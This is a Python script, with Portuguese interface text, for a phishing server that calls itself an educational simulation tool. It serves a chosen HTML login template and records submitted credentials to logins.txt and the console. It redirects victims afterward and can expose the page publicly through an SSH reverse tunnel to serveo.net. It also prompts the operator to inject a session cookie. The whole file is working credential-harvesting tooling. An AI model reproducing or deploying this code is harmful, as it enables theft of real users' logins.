import http.server
import socketserver
import urllib.parse
from datetime import datetime
import os
import subprocess
import secrets

# --- Melhorias Visuais ---
try:
    import colorama
    from colorama import Fore, Style
    colorama.init(autoreset=True)
    
    ASCII_ART = f'''{Fore.CYAN}
    ███████╗██╗████████╗██╗████████╗███████╗██╗     
    ██╔════╝██║╚══██╔══╝██║╚══██╔══╝██╔════╝██║     
    █████╗  ██║   ██║   ██║   ██║   █████╗  ██║     
    ██╔══╝  ██║   ██║   ██║   ██║   ██╔══╝  ██║     
    ██║     ██║   ██║   ██║   ██║   ███████╗███████╗
    ╚═╝     ╚═╝   ╚═╝   ╚═╝   ╚═╝   ╚══════╝╚══════╝
    '''
    
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    RED = Fore.RED
    CYAN = Fore.CYAN
    RESET = Style.RESET_ALL
except ImportError:
    ASCII_ART = "FITITEL"
    GREEN = YELLOW = RED = CYAN = RESET = ""
# ------------------------

LOG_FILE = 'logins.txt'

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    selected_template = "(desconhecido)"

    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            params = urllib.parse.parse_qs(post_data.decode('utf-8'))

            redirect_url = params.get('redirect_url', ['https://www.google.com'])[0]

            fake_session_id = f"fake_session_{secrets.token_hex(16)}"

            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"--- Log Salvo em: {timestamp} ---\n")
                f.write(f"Template: {self.selected_template}\n")
                f.write(f"session_cookie: sessionid={fake_session_id}\n")
                for key, values in params.items():
                    if key != 'redirect_url':
                        f.write(f"{key}: {', '.join(values)}\n")
                f.write("-" * 40 + "\n\n")

            print(f"\n{GREEN}[+] Dados de login capturados com sucesso!{RESET}")
            for key, values in params.items():
                if key != 'redirect_url':
                    display_key = key.replace('_', ' ').capitalize()
                    value = ', '.join(values)
                    print(f"{RED}  -> {display_key}: {value}{RESET}")
            
            print(f"\n{YELLOW}[!] Sessão da Vítima Simulada/Capturada!{RESET}")
            print(f"{YELLOW}  -> Use uma extensão (ex: Cookie Editor) para injetar este cookie no navegador:{RESET}")
            print(f"{YELLOW}    - Nome do Cookie:  sessionid{RESET}")
            print(f"{YELLOW}    - Valor do Cookie: {fake_session_id}{RESET}")

            print(f"\n{CYAN}  - Template: {self.selected_template}{RESET}")
            print(f"{CYAN}  - Redirecionando para: {redirect_url}{RESET}")
            print(f"{YELLOW}  - Os dados completos foram salvos em '{LOG_FILE}'.{RESET}")

            self.send_response(301)
            self.send_header('Location', redirect_url)
            self.end_headers()
        except Exception as e:
            print(f"{RED}[-] Erro ao processar POST request: {e}{RESET}")
            self.send_error(500, "Erro interno do servidor")

def main():
    print(ASCII_ART)
    print("===============================================================")
    print(f"{YELLOW}    Ferramenta de Simulação de Phishing Educacional    {RESET}")
    print("===============================================================")

    html_files = sorted([f for f in os.listdir('.') if f.endswith('.html')])
    if not html_files:
        print(f"{RED}[-] Nenhuma página de template (.html) encontrada.{RESET}")
        return

    print(f"\n{YELLOW}Selecione o template para o ataque:{RESET}")
    for i, filename in enumerate(html_files):
        print(f"  {CYAN}[{i+1}]{RESET} {filename.replace('.html', '')}")

    try:
        choice_str = input(f"\n{GREEN}[+]{RESET} Escolha uma opção: ")
        choice = int(choice_str) - 1
        if not 0 <= choice < len(html_files):
            raise ValueError
        selected_file = html_files[choice]
    except (ValueError, IndexError):
        print(f"{RED}[-] Opção inválida. Saindo.{RESET}")
        return

    try:
        port_str = input(f"{GREEN}[+]{RESET} Digite a porta local (padrão 8000): ")
        port = int(port_str) if port_str.strip() else 8000
    except ValueError:
        print(f"{RED}[-] Porta inválida. Usando a porta padrão 8000.{RESET}")
        port = 8000

    use_tunnel_str = input(f"{GREEN}[+]{RESET} Criar link público com Serveo.net? (s/N): ").lower()

    class DynamicPhishingHandler(PhishingHandler):
        def do_GET(self):
            if self.path == '/':
                self.path = f'/{selected_file}'
            return http.server.SimpleHTTPRequestHandler.do_GET(self)
    
    DynamicPhishingHandler.selected_template = selected_file

    tunnel_process = None
    httpd = None
    try:
        if use_tunnel_str == 's':
            command = ["ssh", "-R", f"80:localhost:{port}", "serveo.net"]
            try:
                print(f"\n{YELLOW}Iniciando túnel com Serveo.net...{RESET}")
                tunnel_process = subprocess.Popen(command)
            except FileNotFoundError:
                print(f"{RED}[-] Comando 'ssh' não encontrado. O túnel não pode ser criado.{RESET}")
                print(f"{YELLOW}  - Certifique-se de que o OpenSSH está no PATH do sistema.{RESET}")
                return

        httpd = socketserver.TCPServer(("", port), DynamicPhishingHandler)
        print("\n===============================================================")
        print(f"{YELLOW}Servidor de Phishing iniciado!{RESET}")
        print(f"  - Template: {CYAN}{selected_file}{RESET}")
        print(f"  - Link Local: {CYAN}http://localhost:{port}{RESET}")
        if tunnel_process:
            print(f"{YELLOW}  - Aguardando link público do Serveo.net (verificar saída do terminal)...{RESET}")
        print(f"\nAguardando vítima...{RESET}")
        print(f"({RED}Pressione Ctrl+C para parar o servidor{RESET})")
        print("===============================================================")
        httpd.serve_forever()

    except KeyboardInterrupt:
        print(f"\n\n{RED}Desligando o servidor...{RESET}")
    except OSError as e:
        print(f"\n{RED}[-] Erro ao iniciar o servidor na porta {port}: {e}{RESET}")
    finally:
        if httpd:
            httpd.server_close()
        if tunnel_process:
            print(f"{RED}Encerrando o túnel SSH...{RESET}")
            tunnel_process.terminate()

if __name__ == "__main__":
    main()
